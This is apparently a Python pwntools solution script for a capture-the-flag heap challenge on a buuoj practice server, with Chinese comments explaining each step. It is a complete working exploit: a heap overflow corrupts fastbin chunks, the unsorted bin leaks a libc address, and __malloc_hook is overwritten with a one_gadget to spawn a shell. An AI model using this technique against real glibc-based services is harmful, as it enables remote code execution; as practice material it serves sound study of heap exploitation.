from pwn import *
from LibcSearcher import *
context.os='linux'
context.arch='amd64'
context.log_level='debug'
p=remote("node4.buuoj.cn",27073)
libc = ELF("/home/pwn/Software/LibcSearcher/libc-database/libc/libc-2.23-Ubuntu16-buuoj.amd64.so")
def debug():
    attach(p)
    pause()
def allo(size):
	p.recvuntil("Command: ")
	p.sendline(str(1))
	p.recvuntil("Size: ")
	p.sendline(str(size))

def fill(idx,size,content):
	p.recvuntil("Command: ")
	p.sendline(str(2))
	p.recvuntil("Index: ")
	p.sendline(str(idx))
	p.recvuntil("Size: ")
	p.sendline(str(size))
	p.recvuntil("Content: ")
	p.sendline(content)

def free(idx):
	p.recvuntil("Command: ")
	p.sendline(str(3))
	p.recvuntil("Index: ")
	p.sendline(str(idx))

def dump(idx):
	p.recvuntil("Command: ")
	p.sendline(str(4))
	p.recvuntil("Index: ")
	p.sendline(str(idx))

allo(0x10)#0
allo(0x10)#1
allo(0x10)#2
allo(0x10)#3
allo(0x80)#4
free(1)
free(2)

payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)
payload += p8(0x80) # 使2的chunk空闲块指向了4号块的位置,4号位为较大的chunk，用来获取目标地址
fill(0,len(payload),payload)

payload = p64(0)*3 + p64(0x21)
fill(3,len(payload),payload) # 让4号块的大小变成0x21，这样4号块就意义上被free了

allo(0x10)#1 The original position of 2 # 申请原本2号块
allo(0x10)#2 4 Simultaneous pointing	# 这里就会申请到4号块的位置

payload = p64(0)*3 + p64(0x91)
fill(3,len(payload),payload) # 将4号块的大小改回 0x91,不然找不到top chunk位置

allo(0x80) # 在申请一块大空间，避免4号块和top chunk合并

free(4)    # 释放4号块
dump(2)
__malloc_hook = u64(p.recvuntil('\x7f')[-6:].ljust(8,b'\0')) - 88 - 0x10
libc_base = __malloc_hook - libc.symbols["__malloc_hook"]
log.info("__malloc_hook: "+ hex(__malloc_hook))
log.info("libc_base: "+ hex(libc_base))

allo(0x60)
free(4) # 相当于做一个切割，将0x80的块分成0x60在fastbin中，0x20在unsortedbin中


payload = p64(__malloc_hook - 35)
fill(2,len(payload),payload)


allo(0x60)
allo(0x60) # 这个就会申请到假chunk

payload = b'a'*(0x8+0x2+0x8+1)
payload += p64(libc_base+0x4526a)
fill(6,len(payload),payload)

allo(79)

p.interactive()